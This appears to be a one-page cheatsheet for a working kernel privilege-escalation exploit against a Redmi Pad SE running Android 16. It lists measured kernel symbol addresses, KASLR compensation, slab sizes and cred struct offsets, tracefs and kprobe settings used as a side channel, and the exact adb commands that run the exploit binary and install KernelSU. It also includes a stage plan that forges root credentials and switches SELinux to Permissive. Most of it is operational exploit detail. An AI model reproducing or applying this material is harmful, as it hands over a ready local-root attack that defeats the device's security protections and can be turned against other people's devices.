# Cheatsheet

[中文](../CHEATSHEET.md) · **English**

> The one-page version. The kind you print out and tape next to your monitor.

---

## Device

```
Redmi Pad SE 8.7  ·  flare  ·  24075RP89G
SoC       MT8786V/N
ROM       HyperOS OS3.0.303.0.WHXMIXM
Android   16  (BP2A.250605.031.A3)
Kernel    6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k
SPL       2026-09-01
BL        locked / verifiedbootstate=green
```

---

## Key constants (measured on this device)

### Symbol addresses (link-time; add the slide)

| Symbol | Link address |
|---|---|
| `selinux_state` | `0xffffffc08236a2e0` |
| `panic_on_warn` | `0xffffffc08211ae0c` |
| `root_user` | `0xffffffc08213f1e0` |
| `init_user_ns` | `0xffffffc08213ef50` |
| `init_ucounts` | `0xffffffc082140cb0` |
| `init_groups` | `0xffffffc082140740` |
| `do_timer_create+0xa8` | `0xffffffc080195d48` |
| `copy_process+0x140` | `0xffffffc0800ab93c` |
| `prepare_creds+0x24` | `0xffffffc0800e4064` |

### Low 21 bits (★ the slide MUST be compensated!)

```
timer_low21  = 0x195d48     runtime: (0x195d48 + 0x80000) & 0x1fffff = 0x15d48
copy_low21   = 0x0ab93c     runtime: (0xab93c  + 0x80000) & 0x1fffff = 0x12b93c
```

**On our device `slide & 0x1fffff = 0x80000` (512 KB aligned, not 2 MiB).**

### Slab geometry

| cache | objsize | per slab | order |
|---|---|---|---|
| `posix_timers_cache` | **264** | **31** | **1 (8 KB)** |
| `cred_jar` | **192** | 21 | 0 |
| `task_struct` | **4800** | 6 | 3 |

```
sizeof(cred)             = 0xb8 (184)
cred bytes_alloc         = 0xc0 (192)
```

### Struct offsets

```
task_struct.cred        0x820
task_struct.real_cred   0x828

cred.uid / gid          0x08      (two u32)
cred.suid / sgid        0x10
cred.euid / egid        0x18
cred.fsuid / fsgid      0x20
cred.cap_inheritable    0x30
cred.cap_permitted      0x38
cred.cap_effective      0x40
cred.cap_bset           0x48
cred.cap_ambient        0x50
cred.security           0x80      SELinux blob
cred.user               0x88
cred.user_ns            0x90
cred.ucounts            0x98
cred.group_info         0xA0

k_itimer.it (union)     0x78
  .cpu.node             0x00      -> rb_node @ 0x78   <- KITIMER_NODE

sizeof(struct page)     0x40 (64)
```

### Full capability set

```
0x1ffffffffff     = 41 bits all set
CapPrm = CapEff = CapBnd = 0x1ffffffffff
```

---

## tracefs

```
/sys/kernel/tracing/tracing_on                          0666  writable
/sys/kernel/tracing/trace                               0666  read/write
/sys/kernel/tracing/buffer_size_kb                      0666  writable
/sys/kernel/tracing/events/*/enable                     0666  writable
/sys/kernel/tracing/kprobe_events                       0777
/sys/kernel/tracing/per_cpu/cpuN/trace_pipe_raw         0640  readtracefs group ★
```

**Pointers in the text `trace` are `%pK` hashed; `trace_pipe_raw` carries real pointers.**

### Event IDs (inferred on this device)

```
kmem:mm_page_alloc          275
kmem:mm_page_free           273
sched:sched_blocked_reason  109   raw offset 16 = void* caller
```

### kprobe syntax

```
p:grp/free_slab free_slab cache=%x0:x64 slab=%x1:x64
r:grp/folio    __filemap_get_folio folio=$retval:x64
```

`free_slab(x0 = kmem_cache*, x1 = slab*)` — argument order confirmed by disassembly.

**★ Simplified EXACT HIT criterion (no vmemmap arithmetic needed):**

```c
hit = (folio == slab) || (folio == slab + 64)
//     first half         second half
// which one is decided by (victim & 0x1fff) >= 4096
```

---

## Commands

### Self-check (zero risk)

```bash
adb shell '/data/local/tmp/shark66118 probe'
```

Expected:

```
PROBE_TIMER made=128 recs=128 low_adj=0x80000
PROBE_SLIDE=0x2b45280000 aligned=0
[calib] timers=512 low_adj=0x80000
[base] best=0xffffff7fc0000000 count=330
[cred] task=... task_recs=1
PROBE_OK
```

### Fire

```bash
adb shell "cd /data/local/tmp && \
  PYB110_KSUD=/data/local/tmp/ksud33 \
  PYB110_MANAGER_PKG=me.weishu.kernelsu \
  PYB110_KMI=android15-6.6 \
  ./shark66118 --auto"
```

### Verify

```bash
adb shell grep kernelsu /proc/modules          # kernelsu ... Live
adb shell su -c id                             # uid=0 ... u:r:ksu:s0
adb shell su -c 'grep Cap /proc/self/status'   # 0x1ffffffffff
```

### Restore

```bash
adb reboot
```

---

## Log quick reference

| Log | Meaning | Action |
|---|---|---|
| `free_seen=1 burst hit=1` | precise hit | continue, reap happens |
| `free_seen=1 burst hit=0` | free seen but page not reclaimed | `PARKED`, re-run |
| `free_seen=0` | free not seen | check probes / trigger |
| `holding zombie` | zombie retained | normal, next attempt may proceed |
| `PARKED=1` | parked | re-run |
| `PLANT_CRED_OK` | cred stage succeeded | |
| `LATE_LOAD_RC=0` | KSU loaded | |
| `LATE_LOAD_SKIP=env-missing` | `PYB110_KSUD` not set | add the env var |
| `[calib] timers=0` | **KASLR low-21 bits not compensated** | see chapter 09 |
| `task_recs=0` but `recs=1` | same | same |
| `FAIL=fake-uid` | stage 3 missed its reclaim | re-run |

---

## Symptom → cause

| Symptom | Cause |
|---|---|
| `timers=0` / `task_recs=0` | KASLR alignment (low 21 bits) |
| `uid=0` but `CapEff=0` | default mode, not fake mode |
| `su: not found` | KSU module not loaded |
| `LATE_LOAD_RC != 0` | ksud version mismatch with the manager |
| `io_setup` EACCES | SELinux Enforcing; needs Permissive |
| program hangs | blocking pipe `write` / tracing not stopped |
| device disconnects | panic; wait 30–60 s for auto-reboot |
| `ptr` hashed in the trace | you are using the text `trace`; use `trace_pipe_raw` |

---

## The three stages

```
1) fake_cred
   reclaim the freed page -> lay out a fake cred (uid=0 + full 0x1ffffffffff)
   -> zero-write task->cred (task+0x820) to point at it
   -> the child forks; prepare_creds() normalises it and allocates a real SELinux blob

2) selinux
   -> zero-write selinux_state.enforcing
   -> getenforce becomes Permissive

3) fake_uid
   -> zero-write fake_cred+0x08 (uid/gid)
   -> resuid = 0/0/0
   -> ksud late-load installs KernelSU

each step needs its own burst hit=1
```

---

## Capability cheat sheet

| Value | Meaning |
|---|---|
| `CapEff = 0x1ffffffffff` | full (root) |
| `CapEff = 0` | empty — **uid=0 still cannot do anything** |
| `CAP_DAC_OVERRIDE` = bit 1 | read/write any file |
| `CAP_SYS_ADMIN` = bit 21 | `setenforce` / `insmod` / mount |

**Criterion: `su -c 'grep Cap /proc/self/status'` and look at `CapEff`, not at `id`.**
